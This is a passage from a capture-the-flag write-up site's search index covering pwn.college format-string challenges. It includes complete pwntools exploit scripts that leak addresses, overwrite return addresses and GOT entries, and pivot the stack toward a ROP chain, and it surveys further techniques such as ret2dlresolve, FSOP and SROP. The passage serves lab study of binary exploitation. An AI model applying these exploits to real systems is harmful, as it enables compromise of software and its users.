0x1fab8\n0x5f8: 0x000055a2df9f77c4 = (r-xp) /host/babyfmt_level8.0_remotelibc + 0x7c4 (main)\n0x600: 0x000055a2df9f7970 = (r-xp) /host/babyfmt_level8.0_remotelibc + 0x970 (__libc_csu_init)\n0x610: 0x000055a2df9f7220 = (r-xp) /host/babyfmt_level8.0_remotelibc + 0x220 (_start)\n0x618: 0x00007ffd0b6edab0 = (rw-p) [stack] + 0x1fab0\n</code></pre> <p>If you try to leak closer executable memory addresses, you will face some issues. For example if you try to leak 0x088 or 0x090 offsets, you can not get those addresses. This happens in the runtime these addresses offsets changes because of executable printing and inserting texts into that stack area. So the needed leak address for executable memory space should be carefully choose. So i decided to choose return address of func in stack which is 0x588: main+406. </p> <p>This chosen because of these addresses should be stable in the those stack locations. This way or another way when func function reach to end it should be return to the main. Also this offset and address will be useful later. So the offset 0x580 is the rbp offset.</p> <p>The final crafted payload for leak: <code>%3$p|%151$p|%150$p</code>.</p> <p></p> <p>The rest is subtracting offsets from addresses and getting base addresses of libc and executable. </p> <p></p> <p>You may wonder why subtracting 0x50 from rbp. As you can see rbp address points rbp_address+0x50 inside of it. This arranged by the executable. If you check a few instruction below from func prologue routine, the addition happens via rax. </p> <pre><code>pwndbg&gt; tele $rsp+0x400 32\n00:0000\u2502-080 0x7ffc5889a010 \u25c2\u2014 0\n... \u2193        11 skipped\n0c:0060\u2502-020 0x7ffc5889a070 \u2014\u25b8 0x55e0ed271970 (__libc_csu_init) \u25c2\u2014 endbr64 \n0d:0068\u2502-018 0x7ffc5889a078 \u25c2\u2014 0xd3440f1a4a413500\n0e:0070\u2502-010 0x7ffc5889a080 \u2014\u25b8 0x7ffc5889a0e0 \u25c2\u2014 0\n0f:0078\u2502-008 0x7ffc5889a088 \u2014\u25b8 0x55e0ed271970 (__libc_csu_init) \u25c2\u2014 endbr64 \n10:0080\u2502 rbp 0x7ffc5889a090 \u2014\u25b8 0x7ffc5889a0e0 \u25c2\u2014 0\n11:0088\u2502+008 0x7ffc5889a098 \u2014\u25b8 0x55e0ed27195a (main+406) \u25c2\u2014 lea rdi, [rip + 0xe39]\n12:0090\u2502+010 0x7ffc5889a0a0 \u25c2\u2014 2\n13:0098\u2502+018 0x7ffc5889a0a8 \u2014\u25b8 0x7ffc5889a1e8 \u2014\u25b8 0x7ffc5889b710 \u25c2\u2014 0\n14:00a0\u2502+020 0x7ffc5889a0b0 \u2014\u25b8 0x7ffc5889a1d8 \u2014\u25b8 0x7ffc5889b6ee \u25c2\u2014 0\n15:00a8\u2502+028 0x7ffc5889a0b8 \u25c2\u2014 0x1ed271970\n16:00b0\u2502+030 0x7ffc5889a0c0 \u25c2\u2014 0\n17:00b8\u2502+038 0x7ffc5889a0c8 \u25c2\u2014 0x2710ed271220\n18:00c0\u2502+040 0x7ffc5889a0d0 \u2014\u25b8 0x7ffc5889a1e0 \u25c2\u2014 0\n19:00c8\u2502+048 0x7ffc5889a0d8 \u2014\u25b8 0x7ffc5889a270 \u25c2\u2014 0\n1a:00d0\u2502+050 0x7ffc5889a0e0 \u25c2\u2014 0\n1b:00d8\u2502+058 0x7ffc5889a0e8 \u2014\u25b8 0x7f2dc325d083 (__libc_start_main+243) \u25c2\u2014 mov edi, eax\n1c:00e0\u2502+060 0x7ffc5889a0f0 \u2014\u25b8 0x7f2dc3462620 (_rtld_global_ro) \u25c2\u2014 0x6100100000000\n1d:00e8\u2502+068 0x7ffc5889a0f8 \u2014\u25b8 0x7ffc5889a1d8 \u2014\u25b8 0x7ffc5889b6ee \u25c2\u2014 0\n1e:00f0\u2502+070 0x7ffc5889a100 \u25c2\u2014 0x100000000\n1f:00f8\u2502+078 0x7ffc5889a108 \u2014\u25b8 0x55e0ed2717c4 (main) \u25c2\u2014 endbr64 \n</code></pre>","tags":["binary-exploitation","format-string-attack","full-relro","pie","libc-leak","rop","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/#find-offset-and-padlen","title":"find offset and padlen","text":"<p>So far so good, now before choosing the target address, find out the user_buffer start offset and needed padlen values.</p> <p>Again i edited search string FmtStr.leak_stack method in <code>/usr/local/lib/python3.12/dist-packages/pwnlib/fmtstr.py</code> .</p> <p>The method after edited looks like this. The only difference END to ENT. This is necessary because END string is affect behaviour of binary working routine.</p> <pre><code>def leak_stack(self, offset, prefix=b\"\"):\n        payload = b\"START%%%d$pENT\" % offset\n        leak = self.execute_fmt(prefix + payload)\n        try:\n            leak = re.findall(br\"START(.*?)ENT\", leak, re.MULTILINE | re.DOTALL)[0]\n            leak = int(leak, 16)\n        except ValueError:\n            leak = 0\n        return leak\n</code></pre> <p>The needed values found as below.</p> <pre><code>[*] Stopped process '/host/babyfmt_level8.0' (pid 216)\n[*] Found format string offset: 30\n[+] User input starts at  : 30\n[+] Needed pads           :7\n[+] Numbwritten           :0\n</code></pre>","tags":["binary-exploitation","format-string-attack","full-relro","pie","libc-leak","rop","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/#find-the-suitable-target-for-code-redirection","title":"Find the suitable target for code redirection","text":"<p>^numbwritten-calculation</p> <p>The first thing in my mind is the overwrite return address. Why not ?  Now the first thing finding how many bytes written in so far. To find out easy way set numbwritten=0x0 and overwrite return with 0x10.</p> <p>Set breakpoint end of func function and what value overwritten there find out. As you can see when try to write return address with 0x10 it turns out 0x69. That means written bytes 0x59.</p> <p></p>","tags":["binary-exploitation","format-string-attack","full-relro","pie","libc-leak","rop","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/#get_flagpy","title":"get_flag.py","text":"<p>After settling numbwritten=0x59 and write return address with win function.</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# This exploit template was generated via:\n# $ pwn template '--libc=./libc.so.6' ./babyfmt_level8.0\nfrom pwn import *\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level8.0')\n\n# Many built-in settings can be controlled on the command-line and show up\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n# for all created processes...\n# ./exploit.py DEBUG NOASLR\n\n# Use the specified remote libc version unless explicitly told to use the\n# local system version with the `LOCAL_LIBC` argument.\n# ./exploit.py LOCAL LOCAL_LIBC\nif args.LOCAL_LIBC:\n    libc = exe.libc\nelse:\n    library_path = libcdb.download_libraries('./libc.so.6')\n    if library_path:\n        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)\n        libc = exe.libc\n    else:\n        libc = ELF('./libc.so.6')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\n#brva 0x17a0\nbrva 0x17c3\ncontinue\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Full RELRO\n# Stack:      Canary found\n# NX:         NX enabled\n# PIE:        PIE enabled\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\ndef send_fmt(payload):\n    io.sendafter(b'vulnerability:\\n', payload)\n\n\nio = start()\n\n#################################################\n#### LEAK ADDRESSES AND CALCULATING OFFSETS #####\n#################################################\n\nsend_fmt('%3$p|%151$p|%150$p')\n\nio.recvuntil(b'Your input is:')\nio.recvline()\nleaks = io.recvline().strip().split(b'|')\n\ninfo(leaks)\nrbp_addr    = int(leaks[2], 16)-0x50\nexe.address = int(leaks[1], 16)-0x195a\nlibc.address= int(leaks[0], 16)-0x10e297\n\nsuccess(f'RBP  Address   : {rbp_addr:#x}')\nsuccess(f'EXE  BASE Addr : {exe.address:#x}')\nsuccess(f'LIBC BASE Addr : {libc.address:#x}')\nsuccess(f'WIN Address    : {exe.sym.win:#x}')\n\n#### write part ####\noffset = 30\npadlen = 7\n\nf = FmtStr(send_fmt, offset=30, padlen=7, numbwritten=0x59)\nf.write(rbp_addr+0x8, exe.sym.win)\nf.execute_writes()\n\nio.sendafter(b'vulnerability:\\n', b'END')\n\nio.interactive()\n</code></pre> <p>The result:</p> <p></p>","tags":["binary-exploitation","format-string-attack","full-relro","pie","libc-leak","rop","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/#conclusion","title":"Conclusion","text":"<p>I think this is perfect binary for practicing other potential targets. As a reminder i dropped 2 link great value to me.</p> <p>https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html</p>","tags":["binary-exploitation","format-string-attack","full-relro","pie","libc-leak","rop","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-%28Full-Relro%2BPIE-Enabled%29/#references","title":"References","text":"<p>https://sourceware.org/glibc/wiki/PointerEncryption</p>","tags":["binary-exploitation","format-string-attack","full-relro","pie","libc-leak","rop","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/10-Format-String-Attack-Format-String-Attack-Once/","title":"Format String Attack - Format String Attack Once","text":"<p>Previous 2 challenges has infinite loops that make us limitless produce format string attack. This variant the format string attack can be executed only once by the binary. Is it ?</p>","tags":["binary-exploitation","format-string-attack","got-overwrite","partial-relro","no-pie","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/10-Format-String-Attack-Format-String-Attack-Once/#babyfmt_level90","title":"babyfmt_level9.0","text":"<p>Partial RELRO and PIE not enabled. These indicators means this challenge gonna be easy.</p> <pre><code>root@5a8cc8d1e548:/host# checksec babyfmt_level9.0\n[*] '/host/babyfmt_level9.0'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n</code></pre>","tags":["binary-exploitation","format-string-attack","got-overwrite","partial-relro","no-pie","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/10-Format-String-Attack-Format-String-Attack-Once/#finding-redirection-address","title":"Finding redirection address","text":"<p>Also we have win function. That's other good sign. The rest is finding suitable target and than we are in business.</p> <pre><code>root@5a8cc8d1e548:/host# readelf -s babyfmt_level9.0\n...\n...\n...\n    71: 00000000004014b9    71 FUNC    GLOBAL DEFAULT   15 init\n    72: 00000000004012b6   515 FUNC    GLOBAL DEFAULT   15 DUMP_STACK\n    73: 000000000040154a   487 FUNC    GLOBAL DEFAULT   15 func\n    74: 00000000004018e0   101 FUNC    GLOBAL DEFAULT   15 __libc_csu_init\n    75: 00000000004040f0     8 OBJECT  GLOBAL DEFAULT   26 sz_\n    76: 0000000000401500    74 FUNC    GLOBAL DEFAULT   15 win --&gt; juicy thing\n    77: 00000000004040f8     8 OBJECT  GLOBAL DEFAULT   26 rp_\n    78: 0000000000404108     0 NOTYPE  GLOBAL DEFAULT   26 _end\n    79: 0000000000401200     5 FUNC    GLOBAL HIDDEN    15 _dl_relocate_sta[...]\n    80: 00000000004011d0    47 FUNC    GLOBAL DEFAULT   15 _start\n    81: 0000000000404100     8 OBJECT  GLOBAL DEFAULT   26 sp_\n    82: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sendfile@@GLIBC_2.2.5\n    83: 0000000000404090     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start\n    84: 0000000000401731   425 FUNC    GLOBAL DEFAULT   15 main\n    85: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.2.5\n    86: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND open@@GLIBC_2.2.5\n    87: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.2.5\n    88: 0000000000404090     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__\n    89: 0000000000401000     0 FUNC    GLOBAL HIDDEN    12 _init\n    90: 00000000004040c0     8 OBJECT  GLOBAL DEFAULT   26 stderr@@GLIBC_2.2.5\n</code></pre>","tags":["binary-exploitation","format-string-attack","got-overwrite","partial-relro","no-pie","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/10-Format-String-Attack-Format-String-Attack-Once/#finding-target-address","title":"Finding target address","text":"<p>The below screenshot shows, vulnerable func function calling printf after than calling exit.  Since binary have Partial RELRO protection and PIE not enabled. That means GOT lies in writable memory map and  the addresses constant.</p> <p>If exit got entry overwritten with win address . Flag will gathered. </p> <p></p>","tags":["binary-exploitation","format-string-attack","got-overwrite","partial-relro","no-pie","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/10-Format-String-Attack-Format-String-Attack-Once/#find-offset-and-padlen-values","title":"Find offset and padlen values","text":"<p>This is previously generated script's output. The script can be found previous posts.</p> <pre><code>[+] Receiving all data: Done (195B)' stopped with exit code 0 (pid 263)\n[DEBUG] Received 0xc3 bytes:\n    b'Here is the result:\\n'\n    b'Your input is:                                                                                                                  \\n'\n    b'aaaabaaacaaadaaaeaaaSTART0x6161646161616361END'\n[*] Found format string offset: 63\n[+] User input starts at  : 63\n[+] Needed pads           :7\n[+] Numbwritten           :0\n</code></pre>","tags":["binary-exploitation","format-string-attack","got-overwrite","partial-relro","no-pie","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/10-Format-String-Attack-Format-String-Attack-Once/#get_flagpy","title":"get_flag.py","text":"<p>The numbwritten value can be calculated like 07-Format String Attack - Redirect Code Execution (Full Relro+PIE Enabled)</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# This exploit template was generated via:\n# $ pwn template '--libc=./libc.so.6' ./babyfmt_level9.0\nfrom pwn import *\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level9.0')\n\n# Many built-in settings can be controlled on the command-line and show up\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n# for all created processes...\n# ./exploit.py DEBUG NOASLR\n\n# Use the specified remote libc version unless explicitly told to use the\n# local system version with the `LOCAL_LIBC` argument.\n# ./exploit.py LOCAL LOCAL_LIBC\nif args.LOCAL_LIBC:\n    libc = exe.libc\nelse:\n    library_path = libcdb.download_libraries('./libc.so.6')\n    if library_path:\n        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)\n        libc = exe.libc\n    else:\n        libc = ELF('./libc.so.6')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\nb *func+482\ncontinue\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Partial RELRO\n# Stack:      No canary found\n# NX:         NX enabled\n# PIE:        No PIE (0x400000)\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\ndef send_fmt(payload):\n    io.sendafter(b'printf on your input and then exit.\\n', payload)\n\nio = start()\n\n#####################\n#### Write Part #####\n#####################\noffset = 63\npadlen = 7\n\nf = FmtStr(send_fmt, offset=offset, padlen=padlen, numbwritten=0x81)\nf.write(exe.got['exit'], exe.sym.win)\nf.execute_writes()\n\ninfo(io.recv())\n\nio.close()\n</code></pre> <p>The Result:</p> <pre><code>[+] Starting local process '/host/babyfmt_level9.0_remotelibc': pid 423\n/usr/local/lib/python3.12/dist-packages/pwnlib/log.py:396: BytesWarning: Bytes is not text; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes\n  self._log(logging.INFO, message, args, kwargs, 'info')\n[*] Here is the result:\n    Your input is:                                                                                                                  \n    kgdjvnq                                                                                                                       #                    \\x00                                          aaaabax@@You win! Here is your flag:\n    pwn.college{wPA**************************************EzW}\n    You win! Here is your flag:\n[*] Stopped process '/host/babyfmt_level9.0_remotelibc' (pid 423)\n</code></pre>","tags":["binary-exploitation","format-string-attack","got-overwrite","partial-relro","no-pie","pwn","CTF","linux-exploitation"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/","title":"Format String Attack - Format String Attack Once (Partial RELRO + no PIE)","text":"<p>This time there is no win function. So the challenge expect us to redirect code execution somewhere else.</p> <p>My opinion, this is where fun starts.</p>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","partial-relro","no-pie","got-overwrite","fsop","srop","ret2csu","ret2dlresolve","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/#babyfmt_level100","title":"babyfmt_level10.0","text":"<p>This challenge has Partial RELRO + no PIE protections. GOT entries lies in writable memory map and addresses are constant. </p> <p>This variant the format string attack can be executed only once by the binary. Is it ?</p> <pre><code>root@a9b395169132:/host# checksec babyfmt_level10.0\n[*] '/host/babyfmt_level10.0'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n</code></pre> <p>As shown below, printf called and than calling exit. Same as previous one.</p> <p></p> <p>There are several ways to abuse this one. But for simplicity the execution will be looped. If exit got entry written with func address, the program never exit and that means infinite format string attack. </p>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","partial-relro","no-pie","got-overwrite","fsop","srop","ret2csu","ret2dlresolve","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/#find-offset-and-padlen-values","title":"find offset and padlen values","text":"<pre><code>[+] Receiving all data: Done (174B)\n[DEBUG] Received 0xae bytes:\n    b'Here is the result:\\n'\n    b'Your input is:                                                                                             \\n'\n    b'aaaabaaacaaadaaaeaaaSTART0x6161616361616162END'\n[*] Process '/host/babyfmt_level10.0' stopped with exit code 0 (pid 279)\n[*] Found format string offset: 46\n[+] User input starts at  : 46\n[+] Needed pads           :4\n[+] Numbwritten           :0\n</code></pre>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","partial-relro","no-pie","got-overwrite","fsop","srop","ret2csu","ret2dlresolve","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/#write-exit-got-entry-func-address","title":"Write exit got entry -&gt; func address","text":"<p>The offset, padlen and numbwritten values detected as previous [[08 - Format String Attack - Redirect Code Execution to win (Full Relro+PIE Enabled)#^numbwritten-calculation|numbwritten calculation]].</p> <p></p>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","partial-relro","no-pie","got-overwrite","fsop","srop","ret2csu","ret2dlresolve","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/#leak-libc-address-write23","title":"Leak LIBC Address (write+23)","text":"<p>Same as previous one, the 3rd offset is the write+23 address. This for the readers practicing other potential targets, i decided to leak also canary value.</p> <p></p>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","partial-relro","no-pie","got-overwrite","fsop","srop","ret2csu","ret2dlresolve","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/#finding-suitable-writable-memory-map-bss","title":"Finding suitable writable memory map (bss)","text":"<p>At this point everything is ready, the only needing is finding writable memory map and fill there. Generally chosen .bss segment. </p> <pre><code>root@a9b395169132:/host# readelf -S babyfmt_level10.0|grep -A3 -B3 '.bss'\n       0000000000000070  0000000000000008  WA       0     0     8\n  [25] .data             PROGBITS         0000000000404070  00003070\n       0000000000000010  0000000000000000  WA       0     0     8\n  [26] .bss              NOBITS           0000000000404080  00003080\n       0000000000000068  0000000000000000  WA       0     0     32\n  [27] .comment          PROGBITS         0000000000000000  00003080\n       000000000000002b  0000000000000001  MS       0     0     1\n</code></pre> <p>The .bss segment starts at <code>0x404080</code>. One important thing to note: since the binary repeatedly calls functions like <code>printf</code>, <code>read</code>, <code>puts</code>, and <code>memset</code> through <code>func</code>, overwriting the stdin, stdout, or stderr pointers in the .bss section can cause unintended crashes or behavior.</p> <pre><code>pwndbg&gt; tele 0x404080 32\n00:0000\u2502     0x404080 (stdout@@GLIBC_2.2.5) \u2014\u25b8 0x7f0b57b6d6a0 (_IO_2_1_stdout_) \u25c2\u2014 0xfbad2887\n01:0008\u2502     0x404088 \u25c2\u2014 0\n02:0010\u2502     0x404090 (stdin@@GLIBC_2.2.5) \u2014\u25b8 0x7f0b57b6c980 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad208b\n03:0018\u2502     0x404098 \u25c2\u2014 0\n04:0020\u2502     0x4040a0 (stderr@@GLIBC_2.2.5) \u2014\u25b8 0x7f0b57b6d5c0 (_IO_2_1_stderr_) \u25c2\u2014 0xfbad2087\n</code></pre> <p>I chose as target address exe.bss()+0x680 = 0x404700.</p>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","partial-relro","no-pie","got-overwrite","fsop","srop","ret2csu","ret2dlresolve","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/#controlling-rip-register","title":"Controlling RIP Register","text":"<p>Preparations mostly done. Now its decided how to get control of RIP into controlled area. To achieve that, decided to overwrite printf's return value in the stack.</p> <p>Why this technique ?</p> <p>The reason, stack values are known. This means there are several simple ways to get the job done.  1. The gadgets can be written into controlled area via format string abuse 2. The gadgets can be written into stack via read and than jump into that stack area.</p> <p>If stack addresses weren\u2019t known, we\u2019d pivot to non-stack control points instead. A ret2dlresolve chain is often the next step: by crafting fake relocation, symbol, and string table entries in a writable region, then invoking the PLT resolver, you can resolve arbitrary functions at runtime even if they weren\u2019t originally imported.</p> <p>After leaking libc\u2019s base address, late-exit hooks such as <code>__exit_funcs</code>, <code>atexit</code>, or <code>tls_dtor_list</code> may become viable targets, since they hold function pointers executed at program shutdown and can still reside in writable libc data segments on some builds.</p> <p>Beyond direct function-pointer overwrites, FSOP (File Structure Oriented Programming) can be used on older or un-hardened libcs: by forging <code>_IO_FILE</code> structures and manipulating the <code>_IO_list_all</code> or vtables, attackers can redirect control flow when standard I/O cleanup routines run.</p> <p>And when ROP gadgets are limited or awkward to use, techniques like ret2csu or compiler-inserted constructor/destructor stubs in <code>__libc_csu_init</code> can help bootstrap controlled function calls or info-leaks by setting up multiple registers at once. Other modern pivots include abusing GOT entries under Partial RELRO, manipulating dynamic linker hooks (<code>_dl_fini</code>, <code>_rtld_global</code> structures), or crafting SROP chains to directly control the CPU context via <code>sigreturn</code>.</p> <p>The shared PoC script, overwriting printf return address in the stack and +8 bytes.</p> <pre><code>#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# This exploit template was generated via:\n# $ pwn template '--libc=./libc.so.6' ./babyfmt_level10.0\nfrom pwn import *\n\n# Set up pwntools for the correct architecture\nexe = context.binary = ELF(args.EXE or './babyfmt_level10.0')\n\n# Many built-in settings can be controlled on the command-line and show up\n# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n# for all created processes...\n# ./exploit.py DEBUG NOASLR\n\n# Use the specified remote libc version unless explicitly told to use the\n# local system version with the `LOCAL_LIBC` argument.\n# ./exploit.py LOCAL LOCAL_LIBC\nif args.LOCAL_LIBC:\n    libc = exe.libc\nelse:\n    library_path = libcdb.download_libraries('./libc.so.6')\n    if library_path:\n        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)\n        libc = exe.libc\n    else:\n        libc = ELF('./libc.so.6')\n\ndef start(argv=[], *a, **kw):\n    '''Start the exploit against the target.'''\n    if args.GDB:\n        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n    else:\n        return process([exe.path] + argv, *a, **kw)\n\n# Specify your GDB script here for debugging\n# GDB will be launched if the exploit is run via e.g.\n# ./exploit.py GDB\ngdbscript = '''\nb *func+444\ncontinue\nc\nc\nsi\nnextret\n'''.format(**locals())\n\n#===========================================================\n#                    EXPLOIT GOES HERE\n#===========================================================\n# Arch:     amd64-64-little\n# RELRO:      Partial RELRO\n# Stack:      No canary found\n# NX:         NX enabled\n# PIE:        No PIE (0x400000)\n# SHSTK:      Enabled\n# IBT:        Enabled\n# Stripped:   No\n\ndef send_fmt(payload):\n    io.sendafter(b'printf on your input and then exit.\\n', payload)\n\nio = start()\n\n####################################\n####### Redirect exit to func ######\n####################################\n\nf = FmtStr(send_fmt, offset=46, padlen=4, numbwritten=0x6c)\nf.write(exe.got['exit'], exe.sym.func)\nf.execute_writes()\n\n\n####################################\n#### Leak Part #####################\n####################################\n\npayload = flat('%3$p|%161$p|%164$p|')\nsend_fmt(payload)\nio.recvuntil(b'Your input is:')\nio.recvline()\n\nleaks = io.recvline().split(b'|')\n\nleak_write23= int(leaks[0], 16)\nleak_canary = int(leaks[1], 16)\nrbp_addr    = int(leaks[2], 16)-0xa00\n\nlibc.address = leak_write23 - 0x10e297 # offset of write+23\n\nsuccess(f'LIBC Base Address: {libc.address:#x}')\nsuccess(f'Canary Value     : {leak_canary:#x}')\nsuccess(f'RBP Address      : {rbp_addr:#x}')\n\n####################################\n#### Write Part ####################\n####################################\n\ntarget_address = exe.bss()+0x680\n\nsuccess(f'Target address: {target_address:#x}')\n\n###### rop chain generation ########\nbinsh = next(libc.search(b'/bin/sh\\0'))\n\nrop = ROP([exe, libc])\n\npop_rdi     = rop.find_gadget(['pop rdi', 'ret'])[0]\npop_rsp     = rop.find_gadget(['pop rsp', 'ret'])[0]\nret         = rop.find_gadget(['ret'])[0]\n\nf.write(rbp_addr-0x4f8, pop_rsp)        # ---&gt; printf return address\nf.write(rbp_addr-0x4f0, target_address) # ---&gt; printf return address+8\nf.write(target_address, 0xdeadbabe)\n\nf.execute_writes()\n\nio.interactive()\n</code></pre> <p>How the calculation works explained below. </p> <p>After executing previous script, the return address of printf points to pop rsp; ret gadget. The distance between printf's return address and rbp address is : rbp_address-0x4f8: return address of printf.</p> <p></p> <p>Continue to execution will cause segmentation of on RIP=0xdeadbabe.</p> <pre><code>pwndbg&gt; c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x00000000deadbabe in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n RAX  0x2aa\n RBX  0x2020202020202020 ('        ')\n RCX  0\n RDX  0\n RDI  0x7f844a7597e0 (_IO_stdfile_1_lock) \u25c2\u2014 0\n RSI  0x7fffdd316ab0 \u25c2\u2014 0x706e692072756f59 ('Your inp')\n R8   0x2aa\n R9   0x2aa\n R10  0xa084ab0 \u25c2\u2014 0x4a758723\n R11  0x246\n R12  0x401190 (_start) \u25c2\u2014 endbr64 \n R13  0x7fffdd31a180 \u25c2\u2014 1\n R14  0\n R15  0\n RBP  0x7fffdd319640 \u2014\u25b8 0x7fffdd319b40 \u2014\u25b8 0x7fffdd31a040 \u2014\u25b8 0x7fffdd31a090 \u25c2\u2014 0\n*RSP  0x404708 \u25c2\u2014 0\n*RIP  0xdeadbabe\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / x86-64 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nInvalid address 0xdeadbabe\n</code></pre>","tags":["binary-exploitation","format-string-attack","rop","ret2libc","partial-relro","no-pie","got-overwrite","fsop","srop","ret2csu","ret2dlresolve","pwn","CTF"]},{"location":"Pwn/Linux/Format%20String%20Vulnerabilities/11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/#get_flagpy","title":"get_flag.py","text":"<p>After taking control of RIP, rest is generating ROP Chain and wait for shell.</p> <p>Note for reader:</p> <p>In the pwn.college setup the challenge binary is setuid-root. If you spawn a shell directly (e.g., via <code>system(\"/bin/sh\")</code>), most shells detect they were invoked from a setuid context and drop privileges to your real UID 